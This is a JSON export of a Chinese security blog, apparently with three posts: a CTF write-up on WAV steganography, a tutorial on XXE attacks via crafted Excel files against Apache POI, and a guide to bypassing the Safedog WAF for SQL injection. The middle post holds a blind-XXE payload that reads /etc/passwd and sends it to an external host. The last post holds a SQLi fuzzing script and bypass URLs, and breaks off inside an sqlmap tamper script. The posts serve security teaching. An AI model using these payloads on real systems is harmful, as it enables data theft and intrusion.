style=\"color:orange;color:#999;padding:2px\">Author:LLMF</div></div><hr><h1 id=\"MISC\"><a href=\"#MISC\" class=\"headerlink\" title=\"MISC\"></a>MISC</h1><h2 id=\"explorere-the-music\"><a href=\"#explorere-the-music\" class=\"headerlink\" title=\"explorere-the-music\"></a>explorere-the-music</h2><p>这道基于wav隐写的题目在这次MISC题中显得中规中矩，但是在这道题目中所运用的知识点也是比较全面和丰富的</p><h3 id=\"0x00\"><a href=\"#0x00\" class=\"headerlink\" title=\"0x00\"></a>0x00</h3><p>把题目下载下来以后拿到的是两个文件，一个是the_sound_of_silence.wav，一个是OpenPuff工具<br>查阅资料可以知道，OpenPuff工具是一个可以用来隐写的专业工具，当然也可用于将隐藏在文件中的数据解密出来<br>OpenPuff的使用方法这里就不赘述了，在Unhide功能内，需要提供三个密码才可以解密被隐写的文件，那么这道题的解题思路就清晰了：在wav文件中找到这三个密码值，进而解密Unhide得到被隐写的数据，从而获得flag</p><center><img style=\"border-radius:.3125em;box-shadow:0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08)\" src=\"../img/hexo-2020-08-06-15-01-31.png\" width=\"50%\" alt><br><div style=\"color:orange;border-bottom:1px solid #d9d9d9;display:inline-block;color:#999;padding:2px\">OpenPuff工具</div></center><h3 id=\"0x02\"><a href=\"#0x02\" class=\"headerlink\" title=\"0x02\"></a>0x02</h3><p>在对wav格式的音频文件的隐写类题目进行解题的时候，通常会用到Audacity</p><blockquote><p><strong>Audacity</strong>是一款易于使用的多轨音频编辑器和记录器，适用于Windows，Mac OS X，GNU / Linux和其他操作系统。<br>在CTF比赛中，可以通过对音频进行频谱的分析，以及音频其他内容的分析，找到flag。<br><a href=\"https://www.audacityteam.org/download/source/\" target=\"_blank\" rel=\"noopener\">https://www.audacityteam.org/download/source/</a></p></blockquote><p>将音频导入到Audacity</p><center><img style=\"border-radius:.3125em;box-shadow:0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08)\" src=\"../img/hexo-2020-08-06-15-56-27.png\" width=\"50%\" alt><br><div style=\"color:orange;border-bottom:1px solid #d9d9d9;display:inline-block;color:#999;padding:2px\">音频波形图</div></center>首先完整听完音频，未发现有效信息，那对于wav音频型隐写题目，接下来还可以从以下几个地方入手<h4 id=\"频谱图\"><a href=\"#频谱图\" class=\"headerlink\" title=\"频谱图\"></a>频谱图</h4><p>将波形图切换到频谱图，查看频谱图中是否含有其他隐藏信息</p><center class=\"half\"><img style=\"border-radius:.3125em;box-shadow:0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08)\" src=\"../img/hexo-2020-08-06-16-35-08.png\" width=\"30%\" alt> <img style=\"border-radius:.3125em;box-shadow:0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08)\" src=\"../img/hexo-2020-08-06-20-26-45.png\" width=\"50%\" alt><br><div style=\"color:orange;border-bottom:1px solid #d9d9d9;display:inline-block;color:#999;padding:2px\">音频频谱图</div></center><p>通过拖动和缩放频谱图可以发现，在频谱图中隐藏着<code>psdB:74208645</code>由此猜测是三个密码中的一个，也由此可推测出三组密码前缀为<code>psdA、psdB、psdC</code></p><h4 id=\"简单字符串查找\"><a href=\"#简单字符串查找\" class=\"headerlink\" title=\"简单字符串查找\"></a>简单字符串查找</h4><p>既然知道了规则，那么就要从其他方向上去寻找密码了，在这里我们也用到最常用的字符串查找，查找存在<code>psd</code>特征的字符串</p><blockquote><p>linux下使用strings配合grep是查找文件内容特征字符串的一个好方法</p></blockquote><p>下面是查找样例</p><pre><code>llmf@DESKTOP-CUGCI8H:/mnt/f/文档资料/Desktop/天翼杯/2007305f227d82badce$ strings the_sound_of_silence.wav | grep psd\npsdC:01374890</code></pre><p>通过查找字符串的方法，得到了<code>psdC</code>，最后只要找到<code>psdA</code>就可以解出这道题了</p><h4 id=\"波形图\"><a href=\"#波形图\" class=\"headerlink\" title=\"波形图\"></a>波形图</h4><p>波形图也是隐藏信息的一个好方法，在这道题目的wav音频中，左右声道波形大致是一致的，因此暂且认为隐藏信息的波形图在音频开始的前小节或最后小节</p><p>从音频开始处观察波形，一直到最后并没有发现有规律的正余弦变换或者高低电平变换，但发现前奏之前有一段微小的波形起伏，切换成波形(dB)(W)进行观察，发现波形(dB)(W)图成高低(峰值)电平的规律变化，将采样率修改为44100Hz以更清晰看到其变化规律</p><center><img style=\"border-radius:.3125em;box-shadow:0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08)\" src=\"../img/hexo-2020-08-06-21-28-37.png\" width=\"50%\" alt><br><div style=\"color:orange;border-bottom:1px solid #d9d9d9;display:inline-block;color:#999;padding:2px\">波形(dB)(W)高低电平图</div></center><p>假设高电平(峰值)为1，低电平为0，不难得到下列二进制字符串(<del>其实很难，得用尺子加抠图平移得方式估算得到</del>)</p><center><img style=\"border-radius:.3125em;box-shadow:0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08)\" src=\"../img/hexo-2020-08-06-21-44-15.png\" width=\"50%\" alt><br><div style=\"color:orange;border-bottom:1px solid #d9d9d9;display:inline-block;color:#999;padding:2px\">很难量出来的图</div></center><pre><code class=\"js\"><span class=\"number\">01110000011100110110010001000001001110100011100000110011001110010011011100111001001100110011011000110111</span></code></pre><p>一共104个二进制字符串，已知psdB和psdC均为13位字符串13x8=104，因此猜测将这104个二进制字符串每8个一组再转化成十六进制再转字符串即可得到psdA</p><pre><code class=\"py\"><span class=\"keyword\">import</span> re\nstr = <span class=\"string\">'01110000011100110110010001000001001110100011100000110011001110010011011100111001001100110011011000110111'</span>\nprint(re.findall(<span class=\"string\">r'.{8}'</span>,string))\n<span class=\"comment\">#01110000 01110011 01100100 01000001 00111010 00111000 00110011 00111001 00110111 00111001 00110011 00110110 00110111</span></code></pre><br><center><img style=\"border-radius:.3125em;box-shadow:0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08)\" src=\"../img/hexo-2020-08-06-22-59-34.png\" width=\"80%\" alt><br><div style=\"color:orange;border-bottom:1px solid #d9d9d9;display:inline-block;color:#999;padding:2px\"><a href=\"http://www.toolzl.com/tools/b2.html\" target=\"_blank\" rel=\"noopener\">二进制转字符串</a></div></center><p>解得<code>psdA:83979367</code></p><h3 id=\"0x03\"><a href=\"#0x03\" class=\"headerlink\" title=\"0x03\"></a>0x03</h3><p>利用上面得到的<code>psdA:83979367</code>、<code>psdB:74208645</code>、<code>psdC:01374890</code>输入到OpenPuff中，就可以解密出隐藏在wav音频中的信息</p><center><img style=\"border-radius:.3125em;box-shadow:0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08)\" src=\"../img/hexo-2020-08-06-23-07-38.png\" width=\"50%\" alt><br><div style=\"color:orange;border-bottom:1px solid #d9d9d9;display:inline-block;color:#999;padding:2px\">OpenPuff进行解密</div></center><p>解密得到一个flag.txt，文本内容就是flag</p><pre><code class=\"python\">LLMF@DESKTOP-CUGCI8H MINGW64 /f/文档资料/Desktop\n$ cat flag.txt\nEB10F48B42D7FB1CE35C171C2EBC0E2D</code></pre><h2 id=\"签到题\"><a href=\"#签到题\" class=\"headerlink\" title=\"签到题\"></a>签到题</h2><h3 id=\"0x00-1\"><a href=\"#0x00-1\" class=\"headerlink\" title=\"0x00\"></a>0x00</h3><p>题目说下载完就可以得到flag，请求题目链接是一个5G大小的文件，要全部下载这个文件肯定不现实，也不是题目想考查的方向<br>那么这里就考察到了下载功能中的断点下载Range头</p><pre><code class=\"h\">GET /<span class=\"number\">6</span>GTest.file HTTP/<span class=\"number\">1.1</span>\nHost: http:<span class=\"comment\">//das.wetolink.com:8941</span>\nUser-Agent: Mozilla/<span class=\"number\">5.0</span> (Windows NT <span class=\"number\">10.0</span>; Win64; x64; rv:<span class=\"number\">78.0</span>) Gecko/<span class=\"number\">20100101</span> Firefox/<span class=\"number\">78.0</span>\nAccept: text/html,application/xhtml+xml,application/xml;q=<span class=\"number\">0.9</span>,image/webp,*<span class=\"comment\">/*;q=0.8</span>\n<span class=\"comment\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>\n<span class=\"comment\">Accept-Encoding: gzip, deflate</span>\n<span class=\"comment\">Connection: close</span>\n<span class=\"comment\">Cookie: JSESSIONID=66A7817B03AB36D8C5288A7E9B2BA9A7; JSESSIONID=4CC2394F96813D8480A5FAD09D3AA8A9</span>\n<span class=\"comment\">Upgrade-Insecure-Requests: 1</span>\n<span class=\"comment\">Range: bytes=-100 #只下载后100bytes的内容</span></code></pre><p>这样就能读取到文件最后的flag值</p><!-- rebuild by neat -->","excerpt":"","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://ll-mf.github.io/tags/CTF/"},{"name":"MISC","slug":"MISC","permalink":"http://ll-mf.github.io/tags/MISC/"}]},{"title":"利用EXCEL进行XXE攻击","date":"2019-10-15T08:45:45.000Z","path":"2019-10-15-利用EXCEL进行XXE攻击.html","content":"<!-- build time:Fri May 14 2021 10:58:02 GMT+0800 (GMT+08:00) --><p><img src=\"../img/hexo-2019-10-15-16-59-42.png\" alt></p><h1 id=\"0x00-前言\"><a href=\"#0x00-前言\" class=\"headerlink\" title=\"0x00 前言\"></a>0x00 前言</h1><p>XML外部实体注入攻击简称XXE，我们可以基于此来对服务器信息进行探测和获取。<br><del>libxml 2.9.0以后，默认不解析外部实体(与php版本无关)，导致XXE漏洞逐渐消亡，但这对于旧系统来说依然是比较常见的。</del><br>对于基于HTTP API发起XXE攻击是网上较为常见的攻击方式，这里来谈一谈利用EXCEL进行XXE攻击。</p><a id=\"more\"></a><h1 id=\"0x01-为什么可以这么做\"><a href=\"#0x01-为什么可以这么做\" class=\"headerlink\" title=\"0x01 为什么可以这么做\"></a>0x01 为什么可以这么做</h1><p>Microsoft Office从2007版本引入了新的开放的XML文件格式，新的XML文件格式基于压缩的ZIP文件格式规范，由许多部分组成。我们可以将其解压缩到特定的文件夹中来查看其包含的文件夹和文件，可以发现其中多数是描述工作簿数据、元数据、文档信息的XML文件。</p><img src=\"../img/hexo-2019-10-15-16-04-18.png\" width=\"35%\"><h1 id=\"0x02-背景信息\"><a href=\"#0x02-背景信息\" class=\"headerlink\" title=\"0x02 背景信息\"></a>0x02 背景信息</h1><p>下面介绍相关的背景信息</p><h2 id=\"CVE-2014-3529\"><a href=\"#CVE-2014-3529\" class=\"headerlink\" title=\"CVE-2014-3529\"></a>CVE-2014-3529</h2><p>Apache POI 是 Apache 软件基金会的开源项目，POI 提供 API 接口给 Java 程序对 Microsoft office 格式文档读写能力。Apache POI 3.10-FINAL及以前版本被发现允许远程攻击者通过注入XML外部实体访问外部实体资源或者读取任意文件。</p><p><strong>影响范围</strong><br>poi-ooxml-3.10-FINAL.jar及以下版本<br><strong>漏洞位置</strong><br>[Content-Types].xml<br><strong>漏洞利用</strong><br>1.新建xxe.xlsx并对其进行解压缩(在WSL中执行)</p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">unzip ../xxe.xlsx  #解压缩xxe.xlsx文件</span><br></pre></td></tr></table></figure><p>得到</p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.</span><br><span class=\"line\">├── [Content_Types].xml</span><br><span class=\"line\">├── docProps</span><br><span class=\"line\">│   ├── app.xml</span><br><span class=\"line\">│   └── core.xml</span><br><span class=\"line\">├── _rels</span><br><span class=\"line\">└── xl</span><br><span class=\"line\">    ├── printerSettings</span><br><span class=\"line\">    │   └── printerSettings1.bin</span><br><span class=\"line\">    ├── _rels</span><br><span class=\"line\">    │   └── workbook.xml.rels</span><br><span class=\"line\">    ├── sharedStrings.xml</span><br><span class=\"line\">    ├── styles.xml</span><br><span class=\"line\">    ├── theme</span><br><span class=\"line\">    │   └── theme1.xml</span><br><span class=\"line\">    ├── workbook.xml</span><br><span class=\"line\">    └── worksheets</span><br><span class=\"line\">        ├── _rels</span><br><span class=\"line\">        │   └── sheet1.xml.rels</span><br><span class=\"line\">        └── sheet1.xml</span><br></pre></td></tr></table></figure><p>2.使用文本编辑器在[Content_Types].xml处注入外部实体。<br>3.将其重新打包成xlsx即可构造好漏洞POC</p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">zip -r xxe.xlsx *</span><br></pre></td></tr></table></figure><h2 id=\"CVE-2017-5644\"><a href=\"#CVE-2017-5644\" class=\"headerlink\" title=\"CVE-2017-5644\"></a>CVE-2017-5644</h2><p>同上，不在赘述</p><p><strong>影响范围</strong><br>poi-ooxml-3.15.jar 及以下版本</p><p><strong>漏洞位置</strong><br>xl/workbook.xml</p><p><strong>漏洞利用</strong><br>步骤基本同上，这次输入外部实体的地方是xl/workbook.xml处</p><p><strong>事实上不单单上述的几个，比如xlsx-streamer.jar等第三方库也会有XXE漏洞的存在</strong></p><h1 id=\"0x03-实际利用\"><a href=\"#0x03-实际利用\" class=\"headerlink\" title=\"0x03 实际利用\"></a>0x03 实际利用</h1><p>某次实际渗透过程中，遇到可上传excel地址如下<br><a href=\"http://xx.xx.xx.xx/system/user/importExcel.html\" target=\"_blank\" rel=\"noopener\">http://xx.xx.xx.xx/system/user/importExcel.html</a><br>该页面实现了利用excel导入用户通讯录等的功能<br><em>因为一些原因，丢失了部分截图，因此涉及到的页面截图不太多</em><br>漏洞触发点在xl/workbook.xml处</p><img src=\"../img/hexo-2019-10-16-11-11-08.png\" width=\"100%\"><p>在2、3行处插入外部实体</p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE x [ &lt;!ENTITY xxe SYSTEM &quot;http://xxx.ceye.io&quot;&gt; ]&gt;</span><br><span class=\"line\">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure><p>这里是让服务器解析器请求我们接收平台URL的内容，从而根据接收平台收到的内容来确定漏洞是否存在。</p><p>将修改后的文件重新打包</p><img src=\"../img/hexo-2019-10-16-14-37-09.png\" width=\"50%\"><p>此时上一级目录会生成一个名叫xxe.xlsx的文件，这个文件直接打开是会报错的。不过没关系，把生成好的文件直接上传到服务器</p><img src=\"../img/hexo-2019-10-16-14-39-58.png\" width=\"50%\"><p>可以看到，服务器抛出异常，在接收平台可以接收到远程服务器发起的请求</p><img src=\"../img/hexo-2019-10-16-14-41-38.png\" width=\"100%\"><p><strong>此时可确认XXE漏洞存在</strong></p><h1 id=\"0x04-其他利用姿势\"><a href=\"#0x04-其他利用姿势\" class=\"headerlink\" title=\"0x04 其他利用姿势\"></a>0x04 其他利用姿势</h1><p>XML解析器解析外部实体时支持多种协议：</p><table><thead><tr><th align=\"center\">libxml2</th><th align=\"center\">PHP</th><th align=\"center\">Java</th><th align=\"center\">.NET</th></tr></thead><tbody><tr><td align=\"center\">file</td><td align=\"center\">file</td><td align=\"center\">file</td><td align=\"center\">file</td></tr><tr><td align=\"center\">http</td><td align=\"center\">http</td><td align=\"center\">http</td><td align=\"center\">http</td></tr><tr><td align=\"center\">ftp</td><td align=\"center\">ftp</td><td align=\"center\">ftp</td><td align=\"center\">ftp</td></tr><tr><td align=\"center\"></td><td align=\"center\">php</td><td align=\"center\">https</td><td align=\"center\">https</td></tr><tr><td align=\"center\"></td><td align=\"center\">compress.zlib</td><td align=\"center\">jar</td><td align=\"center\"></td></tr><tr><td align=\"center\"></td><td align=\"center\">data</td><td align=\"center\">netdoc</td><td align=\"center\"></td></tr><tr><td align=\"center\"></td><td align=\"center\">glob</td><td align=\"center\">mailto</td><td align=\"center\"></td></tr><tr><td align=\"center\"></td><td align=\"center\">phar</td><td align=\"center\">gopher</td><td align=\"center\"></td></tr></tbody></table><p>比如可以使用file协议来读取服务器本地文件内容、http协议可以用于获取Web源码等信息。<br>利用excel进行XXE获取的信息，一般是属于无回显的blind-XXE，此时如果想进一步利用该漏洞去获取更多的信息的话，这个时候就需要引入外部实体<br>以PHP为例，可将文件内容发送到远程服务器<br>远程服务器的dtd内容为</p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://xxxx.ceye.io/?%file;&apos;&gt;&quot;&gt;</span><br><span class=\"line\">%start;</span><br></pre></td></tr></table></figure><p>发送的poc为</p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; ?&gt; </span><br><span class=\"line\">&lt;!DOCTYPE message [</span><br><span class=\"line\">&lt;!ENTITY % remote SYSTEM &quot;http://xx.xx.xx/2019yysllovhsiwoa.dtd&quot; &gt;</span><br><span class=\"line\">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot; &gt;</span><br><span class=\"line\">%remote;</span><br><span class=\"line\">%send;</span><br><span class=\"line\">]&gt;</span><br><span class=\"line\">&lt;message&gt;3sshiwodage&lt;/message&gt;</span><br></pre></td></tr></table></figure><!-- rebuild by neat -->","excerpt":"0x00 前言XML外部实体注入攻击简称XXE，我们可以基于此来对服务器信息进行探测和获取。libxml 2.9.0以后，默认不解析外部实体(与php版本无关)，导致XXE漏洞逐渐消亡，但这对于旧系统来说依然是比较常见的。对于基于HTTP API发起XXE攻击是网上较为常见的攻击方式，这里来谈一谈利用EXCEL进行XXE攻击。","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"http://ll-mf.github.io/tags/Web/"}]},{"title":"对抗WAF继续渗透","date":"2019-10-12T08:12:03.000Z","path":"2019-10-12-对抗WAF继续渗透.html","content":"<!-- build time:Fri May 14 2021 10:58:02 GMT+0800 (GMT+08:00) --><p><img src=\"../img/hexo-2019-10-12-17-29-50.png\" alt></p><p>在渗透测试的过程中，经常会遇到各种各样的WAF，WAF会将用户提交的符合规则库中的恶意数据给阻断，这对渗透测试带来了挑战。要想对抗WAF来继续对目标进行渗透，就必须先了解WAF的类型和原理才能于其规则进行对抗。</p><a id=\"more\"></a><p>WAF大致分为三类：</p><blockquote><p>硬件Web防火墙：就是常说的硬WAF，通常的安装方式是将Waf串行部署在Web服务器前端，用于检测、阻断异常流量。</p></blockquote><blockquote><p>Web防护软件：就是常说的软WAF，则是安装在需要防护的服务器上，实现方式通常是WAF监听端口或以Web容器扩展方式进行请求检测和阻断。</p></blockquote><blockquote><p>云WAF：是近年来随着云计算的推动衍生出来的新产品，云WAF，也称WEB应用防火墙的云模式，这种模式让用户不需要在自己的网络中安装软件程序或部署硬件设备，就可以对网站实施安全防护，它的主要实现方式是利用DNS技术，通过移交域名解析权来实现安全防护。用户的请求首先发送到云端节点进行检测，如存在异常请求则进行拦截否则将请求转发至真实服务器。</p></blockquote><p>由于硬件WAF购买价格昂贵，受众数量较少，因此通常遇到的都是部署在服务器上的软WAF和部署在云服务器上的云WAF，因此这里只讨论存在软WAF和云WAF的情况。</p><h1 id=\"对抗软WAF\"><a href=\"#对抗软WAF\" class=\"headerlink\" title=\"对抗软WAF\"></a>对抗软WAF</h1><p>软WAF比较有代表性的就是安全狗了，因此这里以安全狗为例，其余软WAF均可以使用大致相同的思路——Fuzz 来进行绕过。</p><h2 id=\"绕过安全狗扫描目录\"><a href=\"#绕过安全狗扫描目录\" class=\"headerlink\" title=\"绕过安全狗扫描目录\"></a>绕过安全狗扫描目录</h2><p>在服务器端未开启CC防御时，可采用自定义User-Agent来对站点进行目录扫描，这里使用<strong>DirBuster</strong>来将User-Agent设置成百度爬虫的User-Agent头<br><code>User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)</code></p><img src=\"../img/hexo-2019-10-12-15-30-10.png\" width=\"35%\"><p>下面为<strong>DirBuster</strong>的使用方法<br><img src=\"../img/hexo-2019-10-12-15-30-25.png\" width=\"35%\"></p><h2 id=\"绕过安全狗继续注入\"><a href=\"#绕过安全狗继续注入\" class=\"headerlink\" title=\"绕过安全狗继续注入\"></a>绕过安全狗继续注入</h2><p>安全狗版本<br>时间 2019/8/1<br>安全狗版本 V4.0<br>安全狗规则版本 2018-11-30</p><hr><h3 id=\"SQL注释符-绕过\"><a href=\"#SQL注释符-绕过\" class=\"headerlink\" title=\"SQL注释符/**/绕过\"></a>SQL注释符/**/绕过</h3><p>在安全狗规则中，默认会对添加了SQL注释符的请求进行忽略，因此可以构造形如下面的代码来绕过安全狗：<br><code>192.168.1.3/anquangou.php?a=/*&amp;id=2%20and%201=2&amp;*/</code><br>1=1时返回id=2的用户信息，并且未被拦截<br><img src=\"../img/hexo-2019-10-12-15-53-35.png\" width=\"50%\"><br>1=2时无返回值<br><img src=\"../img/hexo-2019-10-12-15-53-48.png\" width=\"50%\"><br>查询版本信息<br><img src=\"../img/hexo-2019-10-12-15-59-09.png\" width=\"50%\"></p><h3 id=\"FUZZ绕过并配合sqlmap实现自动化绕过注入\"><a href=\"#FUZZ绕过并配合sqlmap实现自动化绕过注入\" class=\"headerlink\" title=\"FUZZ绕过并配合sqlmap实现自动化绕过注入\"></a>FUZZ绕过并配合sqlmap实现自动化绕过注入</h3><p>Fuzz脚本如下：</p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">            <span class=\"string\">'User-Agent'</span>: <span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3)AppleWebKit / 535.20(KHTML, like Gecko) Chrome / 19.0.1036.7Safari / 535.20'</span>,</span><br><span class=\"line\">            <span class=\"string\">'Referer'</span>: <span class=\"string\">'http://www.baidu.com'</span>,</span><br><span class=\"line\">                   <span class=\"string\">'Cookie'</span>: <span class=\"string\">'whoami=print(\"\")'</span>,</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">fuzz_zs = [<span class=\"string\">'/*'</span>, <span class=\"string\">'*/'</span>, <span class=\"string\">'/*!'</span>, <span class=\"string\">'*'</span>, <span class=\"string\">'='</span>, <span class=\"string\">'`'</span>, <span class=\"string\">'!'</span>, <span class=\"string\">'@'</span>, <span class=\"string\">'%'</span>, <span class=\"string\">'.'</span>, <span class=\"string\">'-'</span>, <span class=\"string\">'+'</span>, <span class=\"string\">'|'</span>, <span class=\"string\">'%00'</span>]</span><br><span class=\"line\">fuzz_sz = [<span class=\"string\">''</span>, <span class=\"string\">' '</span>]</span><br><span class=\"line\">fuzz_ch = [<span class=\"string\">\"%0a\"</span>, <span class=\"string\">\"%0b\"</span>, <span class=\"string\">\"%0c\"</span>, <span class=\"string\">\"%0d\"</span>, <span class=\"string\">\"%0e\"</span>, <span class=\"string\">\"%0f\"</span>, <span class=\"string\">\"%0g\"</span>, <span class=\"string\">\"%0h\"</span>, <span class=\"string\">\"%0i\"</span>, <span class=\"string\">\"%0j\"</span>]</span><br><span class=\"line\">Fuzz = fuzz_ch + fuzz_sz + fuzz_zs</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> a <span class=\"keyword\">in</span> Fuzz:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> b <span class=\"keyword\">in</span> Fuzz:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> Fuzz:</span><br><span class=\"line\">                <span class=\"keyword\">for</span> d <span class=\"keyword\">in</span> Fuzz:</span><br><span class=\"line\">                    exp = url + <span class=\"string\">\"%20union\"</span> + <span class=\"string\">\"--%20asdasd\"</span>+ a + b + c + d + <span class=\"string\">\"select\"</span> + <span class=\"string\">\"%201,2,3%20--+\"</span></span><br><span class=\"line\">                    <span class=\"comment\"># print exp</span></span><br><span class=\"line\">                    response = requests.get(url=exp, headers=headers).content</span><br><span class=\"line\">                    <span class=\"comment\">#rint(response)</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> <span class=\"string\">\"safedog\"</span> <span class=\"keyword\">in</span> str(response) <span class=\"keyword\">or</span> <span class=\"string\">\"error\"</span> <span class=\"keyword\">in</span> str(response):</span><br><span class=\"line\">                        <span class=\"keyword\">pass</span></span><br><span class=\"line\">                    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                        <span class=\"keyword\">print</span> (exp)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    url = <span class=\"string\">\"http://192.168.1.3:8080/anquangou.php?id=-1\"</span></span><br><span class=\"line\">    run(url)</span><br></pre></td></tr></table></figure><p>uzz出来的语句为(其实远远不止，只是为了举例)<br><code>fuzz语句 http://192.168.1.3:8080/anquangou.php?id=-1%20union--%20asdasd%0A%0Aselect%201,666,3%20--+</code><br>其他绕过位置放入bypass代码也是一样<br>比如<code>http://192.168.1.3:8080/anquangou.php?id=-1%20union--%20asdasd%0A%0Aselect%201,database(),3%20--+</code>在查询database()时会被拦截,此时将干扰符插入database和()其中，就可以做到bypass</p><p>直接查询database()被拦截，插入Fuzz出来的干扰符后</p><img src=\"../img/hexo-2019-10-12-16-25-43.png\" width=\"50%\"><p>最后可配合sqlmap做成自动化绕过tamper脚本</p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\">#By LLMF  </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">Copyright (c) 2006-2013 sqlmap developers (http://sqlmap.org/)</span></span><br><span class=\"line\"><span class=\"string\">See the file 'doc/COPYING' for copying permission</span></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"></span><br><span 